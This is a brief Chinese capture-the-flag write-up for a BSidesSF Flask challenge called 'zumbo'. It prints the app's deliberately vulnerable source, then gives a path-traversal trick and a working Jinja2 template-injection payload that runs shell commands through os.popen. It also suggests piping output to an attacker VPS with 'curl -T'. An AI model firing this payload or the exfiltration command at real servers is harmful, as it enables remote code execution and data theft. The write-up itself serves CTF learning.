##zumbo.md
key: python站信息搜集，模板注入
进入页面查看源码
<!-- page: index.template, src: /code/server.py -->
最下面一行注释引起了注意。访问
/server.py 得到源码

import flask, sys, os
import requests

app = flask.Flask(__name__)
counter = 12345672


@app.route('/<path:page>')
def custom_page(page):
    if page == 'favicon.ico': return ''
    global counter
    counter += 1
    try:
        template = open(page).read()
    except Exception as e:
        template = str(e)
    template += "\n<!-- page: %s, src: %s -->\n" % (page, __file__)
    return flask.render_template_string(template, name='test', counter=counter);

@app.route('/')
def home():
    return flask.redirect('/index.template');

if __name__ == '__main__':
    flag1 = 'FLAG: FIRST_FLAG_WASNT_HARD'
    with open('/flag') as f:
            flag2 = f.read()
    flag3 = requests.get('http://vault:8080/flag').text

    print "Ready set go!"
    sys.stdout.flush()
    app.run(host="0.0.0.0")

<!-- page: server.py, src: /code/server.py -->

得到第一个flag、
第二个flag通过注释得到当前目录是/code/
所以访问/../flag得到(注意这里要转码。不然不会当做python 的参数，而是会被浏览器解析掉)
这里存在模板注入。通过注册config变量拿到shell好像不行，用另外一种方法
http://zumbo-8ac445b1.ctf.bsidessf.net/{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{c.__init__.func_globals['linecache'].__dict__['os'].popen('curl http://vault:8080/flag').read() }} {% endif %} {% endfor %}
得到最后的flag（这里的命令还有 curl http://vault:8080/flag | curl -T http://vps，直接上传到vps）

